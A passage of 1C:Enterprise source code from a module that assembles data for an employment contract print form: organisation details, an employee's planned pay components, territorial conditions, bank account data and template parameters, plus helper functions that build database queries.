	Сведения.Добавить("""", ""КППЮЛ"");
	Сведения.Добавить("""", ""ФаксОрганизации"");
	Сведения.Добавить("""", ""ТелОрганизации"");
	Сведения.Добавить("""", ""АдресЭлектроннойПочтыОрганизации"");
	
	УстановитьПривилегированныйРежим(Истина);
	//ОргСведения = ЗарплатаКадры.ПолучитьСведенияОбОрганизации(Организация, ДатаПолученияДанных, Сведения);
	ОргСведения = ЗарплатаКадры.ПолучитьСведенияОбОрганизации(Организация, ДатаПолученияДанных, Неопределено);
	УстановитьПривилегированныйРежим(Ложь);
	
	СведенияОбОрганизации.Вставить(""НаименованиеПолное"", ОргСведения.НаимЮЛПол);
	СведенияОбОрганизации.Вставить(""НаименованиеКраткое"", Организация.Наименование);
	СведенияОбОрганизации.Вставить(""ИНН"",  ОргСведения.ИННЮЛ);
	СведенияОбОрганизации.Вставить(""КПП"", ОргСведения.КППЮЛ);
	СведенияОбОрганизации.Вставить(""ОГРН"", ОргСведения.ОГРН);
	СведенияОбОрганизации.Вставить(""Факс"", ОргСведения.ФаксОрганизации);
	СведенияОбОрганизации.Вставить(""Телефон"", ОргСведения.ТелОрганизации);
	СведенияОбОрганизации.Вставить(""Email"", ОргСведения.АдресЭлектроннойПочтыОрганизации);
	
	ВидыКонтактнойИнформации = Новый Массив();
	ВидыКонтактнойИнформации.Добавить(Справочники.ВидыКонтактнойИнформации.ЮрАдресОрганизации);
	ВидыКонтактнойИнформации.Добавить(Справочники.ВидыКонтактнойИнформации.ПочтовыйАдресОрганизации);
	АдресаОрганизации = УправлениеКонтактнойИнформацией.КонтактнаяИнформацияОбъектов(ОбщегоНазначенияКлиентСервер.ЗначениеВМассиве(Организация)
	, ОбщегоНазначенияКлиентСервер.ЗначениеВМассиве(Перечисления.ТипыКонтактнойИнформации.Адрес)
	, ВидыКонтактнойИнформации
	, ДатаПолученияДанных);
	
	ОписаниеЮридическогоАдреса = АдресаОрганизации.Найти(Справочники.ВидыКонтактнойИнформации.ЮрАдресОрганизации, ""Вид"");
	ОписаниеПочтовогоАдреса = АдресаОрганизации.Найти(Справочники.ВидыКонтактнойИнформации.ПочтовыйАдресОрганизации, ""Вид"");
	
	СведенияОбОрганизации.Вставить(""АдресЮридический"", ?((Неопределено = ОписаниеЮридическогоАдреса), """", ОписаниеЮридическогоАдреса.Представление));
	СведенияОбОрганизации.Вставить(""АдресПочтовый"", ?((Неопределено = ОписаниеПочтовогоАдреса), """", ОписаниеПочтовогоАдреса.Представление));
	
	Документ_ПриемНаРаботу_СведенияОбОрганизации = СведенияОбОрганизации;
	
	Возврат Документ_ПриемНаРаботу_СведенияОбОрганизации;
		
КонецФункции // Документ_ПриемНаРаботу_СведенияОбОрганизации()
Функция Документ_ПриемНаРаботу_НачисленияСотрудника(Знач Сотрудник, Знач ДатаПолученияДанных)
	
	Перем Документ_ПриемНаРаботу_НачисленияСотрудника;
	
	Документ_ПриемНаРаботу_ТаблицаНачисленийСотрудника = Новый Структура();
	
	Запрос = Новый Запрос();
	Запрос.МенеджерВременныхТаблиц = Новый МенеджерВременныхТаблиц;
	Запрос.УстановитьПараметр(""Сотрудник"", Сотрудник);
	Запрос.УстановитьПараметр(""Период"", ДатаПолученияДанных);
	Запрос.Текст = ""ВЫБРАТЬ РАЗРЕШЕННЫЕ РАЗЛИЧНЫЕ
	               |	&Сотрудник КАК Сотрудник,
	               |	&Период КАК Период
	               |ПОМЕСТИТЬ ВТСотрудникиПериоды"";
	Запрос.Выполнить();
	
	ЗапросНачислений = КадровыйУчет.ЗапросВТПлановыеНачисленияСотрудников(Истина, ""ВТПлановыеНачисления"", ""ВТСотрудникиПериоды"");
	ЗапросНачислений.МенеджерВременныхТаблиц = Запрос.МенеджерВременныхТаблиц;
	ЗапросНачислений.Выполнить();
	
	ЗапросНачислений.Текст = ""ВЫБРАТЬ
	                         |	ВТПлановыеНачисления.Начисление КАК Начисление,
	                         |	ВТПлановыеНачисления.ОсновнойПоказатель КАК ОсновнойПоказатель,
	                         |	ВТПлановыеНачисления.НачислениеТарифнойСтавки КАК НачислениеТарифнойСтавки,
	                         |	ВЫБОР
	                         |		КОГДА ВТПлановыеНачисления.Начисление.КатегорияНачисленияИлиНеоплаченногоВремени = ЗНАЧЕНИЕ(Перечисление.КатегорииНачисленийИНеоплаченногоВремени.РайонныйКоэффициент)
	                         |			ТОГДА ИСТИНА
	                         |		ИНАЧЕ ЛОЖЬ
	                         |	КОНЕЦ КАК НачислениеРайонногоКоэффициента,
	                         |	ВЫБОР
	                         |		КОГДА ВТПлановыеНачисления.Начисление.КатегорияНачисленияИлиНеоплаченногоВремени = ЗНАЧЕНИЕ(Перечисление.КатегорииНачисленийИНеоплаченногоВремени.СевернаяНадбавка)
	                         |			ТОГДА ИСТИНА
	                         |		ИНАЧЕ ЛОЖЬ
	                         |	КОНЕЦ КАК НачислениеСевернойНадбавки,
	                         |	ЕСТЬNULL(ВТПлановыеНачисления.ЗначениеОсновногоПоказателя, 0) КАК ЗначениеОсновногоПоказателя,
	                         |	ВТПлановыеНачисления.Размер КАК Размер
	                         |ИЗ
	                         |	ВТПлановыеНачисления КАК ВТПлановыеНачисления"";
	
	
	ТаблицаНачислений = ЗапросНачислений.Выполнить().Выгрузить();
	
	// Основное начисление
	Начисления = ТаблицаНачислений.НайтиСтроки(Новый Структура(""НачислениеТарифнойСтавки"", Истина));
	Документ_ПриемНаРаботу_ТаблицаНачисленийСотрудника.Вставить(""ОсновноеНачисление"", ?(0 = Начисления.Количество(), Неопределено, Начисления[0]));
		
	// Районный коэффициент
	Начисления = ТаблицаНачислений.НайтиСтроки(Новый Структура(""НачислениеРайонногоКоэффициента"", Истина));
	Документ_ПриемНаРаботу_ТаблицаНачисленийСотрудника.Вставить(""РайонныйКоэффициент"", ?(0 = Начисления.Количество(), Неопределено, Начисления[0]));
		
	// Северная надбавка
	Начисления = ТаблицаНачислений.НайтиСтроки(Новый Структура(""НачислениеСевернойНадбавки"", Истина));
	Документ_ПриемНаРаботу_ТаблицаНачисленийСотрудника.Вставить(""СевернаяНадбавка"", ?(0 = Начисления.Количество(), Неопределено, Начисления[0]));
	
	// Надбавка за разъездной характер работ
	Начисления = ТаблицаНачислений.НайтиСтроки(Новый Структура(""Начисление"", ПланыВидовРасчета.Начисления.НайтиПоКоду(""КРХР"")));
	Документ_ПриемНаРаботу_ТаблицаНачисленийСотрудника.Вставить(""НадбавкаЗаРазъезднойХарактерРабот"", ?(0 = Начисления.Количество(), Неопределено, Начисления[0]));

	Возврат Документ_ПриемНаРаботу_ТаблицаНачисленийСотрудника;
	
КонецФункции // Документ_ПриемНаРаботу_ТаблицаНачисленийСотрудника()
  
Функция Документ_ПриемНаРаботу(Документ_ПриемНаРаботу) Экспорт
	
	ООП_parent(Документ_ПриемНаРаботу);
	
	Документ_ПриемНаРаботу.Вставить(""НомерТрудовогоДоговора"");
	Документ_ПриемНаРаботу.Вставить(""ДатаТрудовогоДоговора"");
	Документ_ПриемНаРаботу.Вставить(""ТерриториальныеУсловия"", Неопределено);
	Документ_ПриемНаРаботу.Вставить(""Организация"", ООП_Новый(""Стандартные.ЮрФизЛицо""));
	Документ_ПриемНаРаботу.Организация.Вставить(""Ссылка"");
	Документ_ПриемНаРаботу.Организация.Вставить(""Факс"");
	Документ_ПриемНаРаботу.Организация.Вставить(""Телефон"");
	Документ_ПриемНаРаботу.Организация.Вставить(""Email"");
	Документ_ПриемНаРаботу.Организация.ОтветственныеЛица[""Руководитель""].Вставить(""Основание"");
	
	Документ_ПриемНаРаботу.Вставить(""Сотрудник"", ООП_Новый(""Стандартные.ФизическоеЛицо""));
	Документ_ПриемНаРаботу.Сотрудник.Вставить(""Ссылка"");
	Документ_ПриемНаРаботу.Сотрудник.Вставить(""ТерриторияВыполненияРабот"", Справочники.ТерриторииВыполненияРабот.ПустаяСсылка());
	Документ_ПриемНаРаботу.Сотрудник.Вставить(""УдостоверениеЛичности"", ООП_Новый(""Стандартные.ДокументУдостоверяющийЛичность""));
	Документ_ПриемНаРаботу.Сотрудник.Вставить(""АдресРегистрации"", """");
	Документ_ПриемНаРаботу.Сотрудник.Вставить(""ИНН"");
	Документ_ПриемНаРаботу.Сотрудник.Вставить(""СНИЛС"");
	Документ_ПриемНаРаботу.Сотрудник.Вставить(""ТелефонМобильный"");
	Документ_ПриемНаРаботу.Сотрудник.Вставить(""Подразделение"", ООП_Новый(""Стандартные.Подразделение""));
	Документ_ПриемНаРаботу.Сотрудник.Вставить(""ДатаРождения"");
	Документ_ПриемНаРаботу.Сотрудник.Вставить(""Страна"");
	
	Документ_ПриемНаРаботу.Сотрудник.УдостоверениеЛичности.Вставить(""КодПодразделения"");
	
	Документ_ПриемНаРаботу.Вставить(""ОплатаТруда"", ООП_Новый(""ОплатаТруда""));
	Документ_ПриемНаРаботу.Вставить(""УсловияТрудаНаРабочемМесте"", ООП_Новый(""УсловияТрудаНаРабочемМесте""));
	
	Документ_ПриемНаРаботу.Вставить(""ВидЗанятости"");
	Документ_ПриемНаРаботу.Вставить(""ДатаПриема"");
	Документ_ПриемНаРаботу.Вставить(""РазъезднойХарактерРаботы"");
	Документ_ПриемНаРаботу.Вставить(""ВахтовыйМетодРаботы"");
	Документ_ПриемНаРаботу.Вставить(""ДлительностьИспытательногоСрока"");
	Документ_ПриемНаРаботу.Вставить(""ДатаНачала"");
	Документ_ПриемНаРаботу.Вставить(""ДатаОкончания"");
	
	Возврат Документ_ПриемНаРаботу;
	
КонецФункции // Документ_ПриемНаРаботу_Include
Функция Документ_ПриемНаРаботу_Include()
	
	Перем Документ_ПриемНаРаботу_Include;
	
	ООП_Include(""Стандартные.Документ"");
	ООП_Include(""Стандартные.ЮрФизЛицо"");
	ООП_Include(""Стандартные.Подразделение"");
	ООП_Include(""Стандартные.ДокументУдостоверяющийЛичность"");
	ООП_Include(""ОплатаТруда"");
	ООП_Include(""УсловияТрудаНаРабочемМесте"");
	
	ООП_ЗарегистрироватьКласс(""Документ.ПриемНаРаботу"", ""Структура"", ""Стандартные.Документ"");
	
	Возврат Документ_ПриемНаРаботу_Include;
	
КонецФункции

// private
Функция Документ_ПриемНаРаботу_ТерриториальныеУсловияПФРПСтруктурнойЕдиницы(СтруктурнаяЕдиница, ДатаСведений)
	
	Перем ТерриториальныеУсловияПФРПСтруктурнойЕдиницы;
	
	ТерриториальныеУсловияПФРПСтруктурнойЕдиницы = Неопределено;
	
	Запрос = Новый запрос;
	Запрос.МенеджерВременныхТаблиц = Новый МенеджерВременныхТаблиц;
	
	Запрос.УстановитьПараметр(""ДатаСведений"", ДатаСведений);
	Запрос.УстановитьПараметр(""СтруктурнаяЕдиница"", СтруктурнаяЕдиница);
	
	Запрос.Текст =
		""ВЫБРАТЬ
		|	&ДатаСведений КАК Период,
		|	&СтруктурнаяЕдиница КАК СтруктурнаяЕдиница
		|ПОМЕСТИТЬ ВТИзмеренияДаты"";
		
	Запрос.Выполнить();
		
	ЗарплатаКадрыОбщиеНаборыДанных.СоздатьВТИмяРегистраСрезПоследних(
		""ТерриториальныеУсловияПФР"",
		Запрос.МенеджерВременныхТаблиц,
		Истина,
		ЗарплатаКадрыОбщиеНаборыДанных.ОписаниеФильтраДляСоздатьВТИмяРегистра(
			""ВТИзмеренияДаты"",
			""СтруктурнаяЕдиница""));
	
	Запрос.Текст =
		""ВЫБРАТЬ
		|	ТерриториальныеУсловия.ТерриториальныеУсловияПФР
		|ИЗ
		|	ВТТерриториальныеУсловияПФРСрезПоследних КАК ТерриториальныеУсловия"";
		
	РезультатЗапроса = Запрос.Выполнить();
	Если НЕ РезультатЗапроса.Пустой() Тогда
		
		Выборка = РезультатЗапроса.Выбрать();
		Выборка.Следующий();
		ТерриториальныеУсловияПФРПСтруктурнойЕдиницы = Выборка.ТерриториальныеУсловияПФР;
		
	КонецЕсли; 
	
	Возврат ТерриториальныеУсловияПФРПСтруктурнойЕдиницы;
	
КонецФункции

#Область Запросы

#Область ШаблонОписанияЗапроса
//Функция Запрос_<ЗапросИмя>(Запрос, ОбъектИДанные)
//
//  Объект = ОбъектИДанные.Объект;
//		
//	Запрос.УстановитьПараметр(""СсылкаНаОбъект"", Объект.Ссылка);
//	Запрос.УстановитьПараметр(<""ИмяПараметра"">,	<ЗначениеПараметра>);
//
//  <Алгоритм формирования запроса 1>
//  Запрос.Текст = Запрос_Текст(<""ИмяЗапроса"">, <""ИмяТекстаЗапроса"">)
//  
//  <Алгоритм формирования запроса 2>
//  ТекстЗапрос = """";
//  ТекстЗапрос = Запрос_Текст(<""ИмяЗапроса"">, <""ИмяТекстаЗапроса1"">, ТекстЗапроса)
//  ТекстЗапрос = Запрос_Текст(<""ИмяЗапроса"">, <""ИмяТекстаЗапроса2"">, ТекстЗапроса)
//  ...
//	Запрос.Текст = ТекстЗапроса;
//
//  Возврат Запрос;
//
//КонецФункции
//Функция Запрос_<ЗапросИмя>_Текст(ИмяТекстаЗапроса)
//	Запрос_Текст = """";
//
//	<Алгоритм_Формирования_Текста_Запроса>
//  Если ( <""ИмяТекстаЗапроса 1""> = ИмяТекстаЗапроса ) Тогда
//		Возврат
//		<""ТекстЗапроса 1"">;
//	КонецЕсли
//  Если ( <""ИмяТекстаЗапроса 2""> = ИмяТекстаЗапроса ) Тогда
//		Возврат
//		<""ТекстЗапроса 2"">;
//	КонецЕсли
//	...
//
//	Возврат Неопределено;
//	
//КонецФункции

#КонецОбласти //НаименованиеОбласти//

// Формирует запрос
//
// Параметры: 
//  ЗапросИмя    - имя запроса, если не указано - возвращается пустой запрос
//  ДанныеОбъекта - структура - параметры устанавливаемые в запросе
//  Запрос       - Запрос - запрос, который модифицируется, если значение не определено - создается новый запрос
//
// Возвращаемое значение:
//  Запрос
//
Функция Запрос_Создать(Знач Запрос, Знач ИмяЗапроса, Знач Параметры)
	
	Перем Запрос_Создать;
	
	Если ( Неопределено = Запрос ИЛИ Неопределено = ИмяЗапроса ИЛИ """" = ИмяЗапроса ) Тогда
		Возврат Неопределено
	КонецЕсли; 
	
	Код = ""Запрос_Создать = Запрос_"" + ИмяЗапроса + ""(Запрос, Параметры)"";
	Выполнить(Код);
	
	Возврат Запрос_Создать;
	
КонецФункции
Функция Запрос_Выполнить(Знач Запрос, Знач ИмяЗапроса, Знач Параметры)
	
	Перем Запрос_Выполнить; // Возвращаемое значение
	
	Запрос            = Запрос_Создать(Новый Запрос, ИмяЗапроса, Параметры);
	Запрос_Выполнить  = ?(Неопределено = Запрос, Неопределено, Запрос.Выполнить());
	
	Возврат Запрос_Выполнить;
	
КонецФункции
Функция Запрос_Текст(Знач ИмяЗапроса, Знач ИмяТекстаЗапроса = Неопределено, Знач ТекстЗапроса = Неопределено)
	
	Перем Запрос_Текст; // Возвращаемое значение
	Перем Результат;
	
	Код = "" Результат = Запрос_"" + ИмяЗапроса + ""_Текст(ИмяТекстаЗапроса)"";
	Выполнить(Код);
	
	Если ( Неопределено = ТекстЗапроса ИЛИ Тип(""Строка"") <> ТипЗнч(ТекстЗапроса) ИЛИ """" = ТекстЗапроса ) Тогда
		Запрос_Текст = Результат;
	Иначе
		Запрос_Текст = ТекстЗапроса + ""
		|;
		|
		|////////////////////////////////////////////////////////////////////////////////
		|"" + Результат;
	КонецЕсли; 
	
	Возврат Запрос_Текст;
	
КонецФункции // Запрос_Текст

// Функция - формирование запроса на получение данных по объекту
// Параметры:
//  Запрос			 - Запрос	 - Формируемый запрос
//  ДанныеОбъекта	 - Структура - Структура данныз
// 
// Возвращаемое значение:
//   - подготовленный запрос Запрос
//
Функция Запрос_Объект(Знач Запрос, Знач Параметры)
	
	Запрос.УстановитьПараметр(""Ссылка"", Параметры.Ссылка);
	Запрос.Текст = Запрос_Текст(""Объект"");
	
	Возврат Запрос;
	
КонецФункции
// Функция - Запрос объект текст
//
// Параметры:
//  ЗапросТекстИмя	 - 	 - 
// 
// Возвращаемое значение:
//   - 
//
Функция Запрос_Объект_Текст(Знач ИмяТекстаЗапроса)
	
	Возврат	
	""ВЫБРАТЬ РАЗРЕШЕННЫЕ
	|	Документ_ПриемНаРаботу.Ссылка КАК Ссылка,
	|	Документ_ПриемНаРаботу.Номер КАК Номер,
	|	Документ_ПриемНаРаботу.Дата КАК Дата,
	|	Документ_ПриемНаРаботу.Организация КАК Организация,
	|	Документ_ПриемНаРаботу.Сотрудник КАК Сотрудник,
	|	Документ_ПриемНаРаботу.Должность КАК Должность,
	|	Документ_ПриемНаРаботу.Должность.Наименование КАК ДолжностьНаименование,
	|	Документ_ПриемНаРаботу.Подразделение КАК Подразделение,
	|	Документ_ПриемНаРаботу.Подразделение.Наименование КАК ПодразделениеНаименование,
	|	Документ_ПриемНаРаботу.Территория КАК Территория,
	|	Документ_ПриемНаРаботу.Руководитель КАК Руководитель,
	|	Документ_ПриемНаРаботу.ДолжностьРуководителя КАК ДолжностьРуководителя,
	|	Документ_ПриемНаРаботу.ОснованиеПредставителяНанимателя КАК ОснованиеПредставителяНанимателя,
	|	Документ_ПриемНаРаботу.ДлительностьИспытательногоСрока КАК ДлительностьИспытательногоСрока,
	|	Документ_ПриемНаРаботу.ТрудовойДоговорНомер КАК ТрудовойДоговорНомер,
	|	Документ_ПриемНаРаботу.ТрудовойДоговорДата КАК ТрудовойДоговорДата,
	|	Документ_ПриемНаРаботу.ВидЗанятости КАК ВидЗанятости,
	|	Документ_ПриемНаРаботу.ДатаПриема КАК ДатаПриема,
	|	Документ_ПриемНаРаботу.ГрафикРаботы.СпособЗаполнения = ЗНАЧЕНИЕ(Перечисление.СпособыЗаполненияГрафикаРаботы.ПоЦикламПроизвольнойДлины) КАК ВахтовыйМетодРаботы
	|ИЗ
	|	Документ.ПриемНаРаботу КАК Документ_ПриемНаРаботу
	|ГДЕ
	|	Документ_ПриемНаРаботу.Ссылка = &Ссылка"";
	
КонецФункции

Функция Запрос_РасчетныйСчет(Знач Запрос, Знач Параметры)
	
	Запрос.УстановитьПараметр(""Ссылка"", Параметры.Ссылка);
	Запрос.Текст = Запрос_Текст(""РасчетныйСчет"");
	
	Возврат Запрос;
	
КонецФункции
Функция Запрос_РасчетныйСчет_Текст(Знач ИмяТекстаЗапроса)
	
	Возврат	
	""ВЫБРАТЬ ПЕРВЫЕ 1
	|	ЗарплатныеПроекты.Банк.Наименование КАК БанкНаименование,
	|	ЗарплатныеПроекты.Банк.КоррСчет КАК БанкКорреспондентскийСчет,
	|	ЗарплатныеПроекты.Банк.Город КАК БанкГород,
	|	ЗарплатныеПроекты.Банк.Код КАК БанкБИК,
	|	ЗарплатныеПроекты.РасчетныйСчет КАК Номер
	|ИЗ
	|	Справочник.ЗарплатныеПроекты КАК ЗарплатныеПроекты"";
	
КонецФункции

#КонецОбласти //Запросы//

#КонецОбласти
#Область class_ОплатаТруда

// public
Функция ОплатаТруда_ФорматОсновнойПоказатель(Знач ОсновнойПоказатель)

	Перем ФорматОсновнойПоказатель;                                                   

	ФорматОсновнойПоказатель = """";
	
	Если (Справочники.ПоказателиРасчетаЗарплаты.Оклад = ОсновнойПоказатель) Тогда
		ФорматОсновнойПоказатель = ""должностного оклада"";
	ИначеЕсли (Справочники.ПоказателиРасчетаЗарплаты.ТарифнаяСтавкаЧасовая = ОсновнойПоказатель) Тогда
		ФорматОсновнойПоказатель = ""часовой тарифной ставки"";
	Иначе
		ВызватьИсключение ""Недопустимое значение основного показателя """""" + ОсновнойПоказатель + """""" у выбранного сотрудника."";
	КонецЕсли;
	
	Возврат ФорматОсновнойПоказатель;
	
КонецФункции // ОплатаТруда_ФорматОсновнойПоказатель()
 
// protected
Функция ОплатаТруда(Знач ОплатаТруда)
	
	ОплатаТруда.Вставить(""Вид"");
	ОплатаТруда.Вставить(""ОкладСтавка"");
	ОплатаТруда.Вставить(""СтавкаНДФЛ"");
	ОплатаТруда.Вставить(""РайонныйКоэффициент"");
	ОплатаТруда.Вставить(""ПроцентСевернойНадбавки"");
	ОплатаТруда.Вставить(""ОсновнойПоказатель"");
	
	Возврат ОплатаТруда;
	
КонецФункции
Функция ОплатаТруда_Include()
	
	Перем ОплатаТруда_Include; // Возвращаемое значение
	
	ООП_ЗарегистрироватьКласс(""ОплатаТруда"", ""Структура"");		
	
	Возврат ОплатаТруда_Include;
	
КонецФункции // ОплатаТруда_Include

#КонецОбласти //class_ОплатаТруда//
#Область class_УсловияТрудаНаРабочемМесте
// public
Функция УсловияТрудаНаРабочемМесте_Представление(Знач this)
	
	Перем Представление;
	
	УсловияТрудаНаРабочемМестеПредставления = Новый Соответствие();
	УсловияТрудаНаРабочемМестеПредставления.Вставить(Перечисления.КлассыУсловийТрудаПоРезультатамСпециальнойОценки.ПустаяСсылка(), ""в нормальных условиях"");
	УсловияТрудаНаРабочемМестеПредставления.Вставить(Перечисления.КлассыУсловийТрудаПоРезультатамСпециальнойОценки.Вредный3, ""во вредных условиях труда (3 класс)"");
	 
	Представление = УсловияТрудаНаРабочемМестеПредставления.Получить(this.Вид);
	
	Возврат Представление;
	
КонецФункции

// protected
Функция УсловияТрудаНаРабочемМесте(Знач УсловияТрудаНаРабочемМесте)
	
	УсловияТрудаНаРабочемМесте.Вставить(""Вид"", Перечисления.КлассыУсловийТрудаПоРезультатамСпециальнойОценки.ПустаяСсылка());
	
	Возврат УсловияТрудаНаРабочемМесте;
	
КонецФункции
Функция УсловияТрудаНаРабочемМесте_Include()
	
	Перем УсловияТрудаНаРабочемМесте_Include; // Возвращаемое значение
	
	ООП_ЗарегистрироватьКласс(""УсловияТрудаНаРабочемМесте"", ""Структура"");		
	
	Возврат УсловияТрудаНаРабочемМесте_Include;
	
КонецФункции // УсловияТрудаНаРабочемМесте_Include

#КонецОбласти //class_УсловияТрудаНаРабочемМесте//
#Область class_ПФ_MXL_ТрудовойДоговор

// public
Процедура ПФ_MXL_ТрудовойДоговор_ВТабличныйДокумент(ЗначенияПараметровМакета, Знач Макет, Знач ОписанияОбластей, Знач ПечатнаяФорма) Экспорт
	
	
	Макет_Макет_ВТабличныйДокументПрисоединитьОбластьИЗаполнитьПараметры(ЗначенияПараметровМакета, Макет, ОписанияОбластей[""Договор""], ПечатнаяФорма);
	
КонецПроцедуры                   
Функция ПФ_MXL_ТрудовойДоговор_ЗначенияПараметров(Знач Макет, Знач Данные) Экспорт
	
	Перем ПФ_MXL_ТрудовойДоговор_ЗначенияПараметров; // Возвращаемое значение
	
	Перем ЗначенияПараметров;
	Перем ЗначенияПараметровСпецификации, ЗначенияПараметровСтрокиСпецификации;
	Перем ЗначенияПараметровКомиссии, ЗначенияПараметровЧленаКомиссии;
	
	Перем Организация, Руководитель, Сотрудник, Приказ;
	
	ЗначенияПараметров = Новый Структура;
	Договор = Данные;
	Организация = Договор.Организация;
	Сотрудник = Договор.Сотрудник;
	УсловияТрудаНаРабочемМесте = Договор.УсловияТрудаНаРабочемМесте;
	ОплатаТруда = Договор.ОплатаТруда;
	Руководитель = Организация.ОтветственныеЛица[""Руководитель""];
	РасчетныйСчет = Организация.РасчетныйСчет;
	Банк = РасчетныйСчет.Банк;

	#Область Договор
	ЗначенияПараметров.Вставить(""Договор_ДатаЛокальныйФормат"", ?(ЗначениеЗаполнено(Договор.ДатаТрудовогоДоговора), Формат(Договор.ДатаТрудовогоДоговора, ""ДЛФ=DD""), """"));
	
	ЗначенияПараметров.Вставить(""Договор_ДатаНачалаЛокальныйФормат"", """");
	Если (ЗначениеЗаполнено(Договор.ДатаПриема)) Тогда
		
		ЗначенияПараметров.Договор_ДатаНачалаЛокальныйФормат = Формат(Договор.ДатаПриема, ""ДЛФ=DD"");
		Если (Договор.ДатаТрудовогоДоговора = NULL) Тогда
			ЗначенияПараметров.Договор_ДатаЛокальныйФормат = ЗначенияПараметров.Договор_ДатаНачалаЛокальныйФормат;
		КонецЕсли;
		
	Иначе
		ЗначенияПараметров.Договор_ДатаНачала = ЗначенияПараметров.Договор_Дата;
	КонецЕсли;
	
	Договор_ДлительностьИспытательногоСрока = """";
	ДлительностьИспытательногоСрокаМесяцы = Цел(Договор.ДлительностьИспытательногоСрока);
	ДлительностьИспытательногоСрокаНедели = Цел(4*(Договор.ДлительностьИспытательногоСрока - Цел(Договор.ДлительностьИспытательногоСрока)));
	
	ДлительностьИспытательногоСрокаМесяцыСтрокой = ?(0 = ДлительностьИспытательногоСрокаМесяцы, """", СтрокаСЧислом("";%1 месяц;;%1 месяца;%1 месяцев;%1 месяца"", ДлительностьИспытательногоСрокаМесяцы, ВидЧисловогоЗначения.Количественное, ""L=ru""));
	ДлительностьИспытательногоСрокаНеделиСтрокой = ?(0 = ДлительностьИспытательногоСрокаНедели, """", СтрокаСЧислом("";%1 неделя;;%1 недели;%1 недель;%1 недели"", ДлительностьИспытательногоСрокаНедели, ВидЧисловогоЗначения.Количественное, ""L=ru""));
	ДлительностьИспытательногоСрокаРазделитель = ?(0 = ДлительностьИспытательногоСрокаМесяцы ИЛИ 0 = ДлительностьИспытательногоСрокаНедели, """", "" "");
	
	Договор_ДлительностьИспытательногоСрока = """"
	+ ДлительностьИспытательногоСрокаМесяцыСтрокой
	+ ДлительностьИспытательногоСрокаРазделитель
	+ ДлительностьИспытательногоСрокаНеделиСтрокой
	+ """";
	
	ЗначенияПараметров.Вставить(""Договор_ДлительностьИспытательногоСрока"", Договор_ДлительностьИспытательногоСрока);
	ЗначенияПараметров.Вставить(""Договор_ДатаОкончанияЛокальныйФормат"", Формат(Договор.ДатаОкончания, ""ДЛФ=DD""));

	ЗначенияПараметров.Вставить(""Договор_Номер"", Договор.НомерТрудовогоДоговора);
	ЗначенияПараметров.Вставить(""Договор_ВидЗанятости"", ПФ_MXL_ТрудовойДоговор_ФорматВидЗанятости(Договор.ВидЗанятости));
	ЗначенияПараметров.Вставить(""Договор_МестоВыполненияРабот"", ПФ_MXL_ТрудовойДоговор_ФорматТерриториальныеУсловия(Договор.ТерриториальныеУсловия));
	
	#КонецОбласти
	#Область Организация
	
	ЗначенияПараметров.Вставить(""Организация_АдресЮридический"", Организация.Адреса[""Юридический""]);
	ЗначенияПараметров.Вставить(""Организация_ОГРН"", Организация.ОГРН);
	ЗначенияПараметров.Вставить(""Организация_ИНН"", Организация.ИНН);
	ЗначенияПараметров.Вставить(""Организация_КПП"", Организация.КПП);
	ЗначенияПараметров.Вставить(""Организация_НаименованиеКраткое"", Стандартные_ЮрФизЛицо_Наименование(Организация, ""Краткое""));
	ЗначенияПараметров.Вставить(""Организация_НаименованиеСокращенное"", Стандартные_ЮрФизЛицо_Наименование(Организация, ""Краткое""));
	ЗначенияПараметров.Вставить(""Организация_НаименованиеПолное"", Стандартные_ЮрФизЛицо_Наименование(Организация, ""Полное""));
	ЗначенияПараметров.Вставить(""Организация_Телефон"", Организация.Телефон);
	
	#КонецОбласти
	#Область Банк
	ЗначенияПараметров.Вставить(""Банк_Наименование"", Банк.Наименование);
	ЗначенияПараметров.Вставить(""Банк_Город"", Банк.Город);
	ЗначенияПараметров.Вставить(""Банк_КорреспондентскийСчет"", Банк.КорреспондентскийСчет);
	ЗначенияПараметров.Вставить(""Банк_БИК"", Банк.БИК);
	#КонецОбласти
	#Область Руководитель
	
	ЗначенияПараметров.Вставить(""Руководитель_Должность_Наименование"", Стандартные_Должность_Представление(Руководитель.Должность));
	ЗначенияПараметров.Вставить(""Руководитель_Должность_НаименованиеРодительныйПадеж"", Стандартные_Должность_Склонение(Руководитель.Должность, 2, Руководитель.Должность.Ссылка));
	ЗначенияПараметров.Вставить(""Руководитель_ОснованиеРодительныйПадеж"", ?(ЗначениеЗаполнено(Руководитель.Основание), Руководитель.Основание, ""Устава""));
	ЗначенияПараметров.Вставить(""Руководитель_ФИО_ФамилияИмяОтчествоРодительныйПадеж"", Стандартные_ФИО_Склонение(Руководитель.ФИО, 2, Руководитель.Ссылка, Руководитель.Пол));
	ЗначенияПараметров.Вставить(""Руководитель_ФИО_ФамилияИО"", Стандартные_ФИО_ФамилияИО(Руководитель.ФИО));
	
	#КонецОбласти 
	#Область Сотрудник
	
	ЗначенияПараметров.Вставить(""Сотрудник_АдресРегистрации"", Сотрудник.АдресРегистрации);
	ЗначенияПараметров.Вставить(""Сотрудник_ДатаРождения"", Сотрудник.ДатаРождения);
	//ЗначенияПараметров.Вставить(""Сотрудник_Должность_Наименование"", Стандартные_Должность_Наименование(Сотрудник.Должность));
	ЗначенияПараметров.Вставить(""Сотрудник_Должность_НаименованиеРодительныйПадеж"", НРег(Стандартные_Должность_Склонение(Сотрудник.Должность, 2, Сотрудник.Должность.Ссылка)));
	ЗначенияПараметров.Вставить(""Сотрудник_Должность_НаименованиеТворительныйПадеж"", НРег(Стандартные_Должность_Склонение(Сотрудник.Должность, 5, Сотрудник.Должность.Ссылка)));
	ЗначенияПараметров.Вставить(""Сотрудник_ИНН"", Сотрудник.ИНН);
	
	Сотрудник_Подразделение_Наименование = НРег(Стандартные_Подразделение_Наименование(Сотрудник.Подразделение));
	Если (НЕ Сотрудник.ТерриторияВыполненияРабот.Пустая()) Тогда
		ТерриторияВыполненияРаботНаименование = УправлениеСвойствами.ЗначениеСвойства(Сотрудник.ТерриторияВыполненияРабот, ""НаименованиеРодительныйПадеж"");
		Сотрудник_Подразделение_Наименование = Сотрудник_Подразделение_Наименование + ?(ПустаяСтрока(ТерриторияВыполненияРаботНаименование), """", "" "" + ТерриторияВыполненияРаботНаименование);
	КонецЕсли;
	
	ЗначенияПараметров.Вставить(""Сотрудник_Подразделение_Наименование"", Сотрудник_Подразделение_Наименование);
	
	ЗначенияПараметров.Вставить(""Сотрудник_СНИЛС"", Сотрудник.СНИЛС);
	ЗначенияПараметров.Вставить(""Сотрудник_УдостоверениеЛичности_Представление"", Стандартные_ДокументУдостоверяющийЛичность_Представление(Сотрудник.УдостоверениеЛичности));
